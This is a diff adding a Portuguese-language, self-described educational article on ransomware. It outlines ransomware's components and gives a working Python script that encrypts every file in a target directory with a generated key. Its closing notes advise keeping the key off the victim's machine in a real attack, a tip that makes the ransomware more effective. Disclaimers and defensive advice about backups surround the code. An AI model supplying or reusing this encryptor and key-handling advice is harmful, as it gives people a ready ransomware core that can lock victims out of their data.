@@ -1,0 +1,81 @@
+Antes de mais nada, é crucial entender que a criação e a disseminação de ransomware, ou qualquer outro tipo de malware, é ilegal e antiética. No entanto, para fins educacionais e de conscientização, é possível discutir a lógica por trás desses programas maliciosos. Este documento visa apenas a aprendizagem e conscientização sobre como proteger sistemas e dados contra tais ameaças.
+
+## Introdução ao Ransomware
+
+Ransomware é um tipo de malware que criptografa os arquivos da vítima, exigindo um pagamento (resgate) para a recuperação dos dados. O uso de criptografia forte torna a recuperação dos arquivos sem a chave de descriptografia praticamente impossível.
+
+## Componentes de um Ransomware
+
+1. **Vetor de Infecção**: O meio pelo qual o ransomware se propaga (e.g., e-mail phishing, downloads maliciosos, exploração de vulnerabilidades).
+2. **Mecanismo de Criptografia**: Algoritmo que criptografa os arquivos da vítima.
+3. **Mecanismo de Comunicação**: Canal pelo qual o ransomware comunica a vítima sobre o resgate (e.g., mensagem na tela, arquivos de texto).
+4. **Mecanismo de Pagamento**: Geralmente envolve criptomoedas para dificultar o rastreamento.
+
+## Exemplo Simples de Ransomware (Para Fins Educacionais)
+
+Abaixo está um exemplo ilustrativo em Python que demonstra a lógica básica por trás da criptografia de arquivos. **Não execute este código em nenhum sistema real**.
+
+### Criptografia de Arquivos
+
+```python
+from cryptography.fernet import Fernet
+import os
+
+# Gerar uma chave de criptografia
+def generate_key():
+    key = Fernet.generate_key()
+    with open("encryption_key.key", "wb") as key_file:
+        key_file.write(key)
+
+# Carregar a chave de criptografia
+def load_key():
+    return open("encryption_key.key", "rb").read()
+
+# Criptografar arquivos
+def encrypt_file(file_path, key):
+    fernet = Fernet(key)
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+    encrypted_data = fernet.encrypt(file_data)
+    with open(file_path, "wb") as file:
+        file.write(encrypted_data)
+
+# Descriptografar arquivos (caso tenha a chave)
+def decrypt_file(file_path, key):
+    fernet = Fernet(key)
+    with open(file_path, "rb") as file:
+        encrypted_data = file.read()
+    decrypted_data = fernet.decrypt(encrypted_data)
+    with open(file_path, "wb") as file:
+        file.write(decrypted_data)
+
+# Caminho para a pasta a ser criptografada
+directory = "path_to_your_directory"
+
+# Gerar e carregar a chave
+generate_key()
+key = load_key()
+
+# Criptografar todos os arquivos no diretório
+for filename in os.listdir(directory):
+    file_path = os.path.join(directory, filename)
+    if os.path.isfile(file_path):
+        encrypt_file(file_path, key)
+```
+
+### Descrição do Código
+
+1. **Geração de Chave**: Uma chave de criptografia é gerada e salva em um arquivo chamado `encryption_key.key`.
+2. **Carregamento da Chave**: A chave de criptografia é carregada do arquivo.
+3. **Criptografia de Arquivos**: Os arquivos no diretório especificado são criptografados usando a chave gerada.
+4. **Descriptografia de Arquivos**: Função disponível para descriptografar os arquivos, caso a chave esteja disponível.
+
+### Considerações Finais
+
+1. **Segurança da Chave**: Em um cenário real, a chave deve ser protegida de forma segura e não deve ser armazenada no sistema da vítima.
+2. **Legalidade**: Este exemplo é puramente educacional. Criação e disseminação de ransomware são atividades ilegais e puníveis por lei.
+3. **Proteção**: Usuários e organizações devem manter backups regulares, usar software de segurança atualizado e estar cientes das melhores práticas de segurança cibernética para se protegerem contra ransomware.
+
+## Conclusão
+
+Entender como um ransomware funciona pode ajudar na criação de defesas mais robustas e na conscientização sobre práticas seguras. O conhecimento deve sempre ser utilizado para o bem e a proteção das pessoas e organizações.
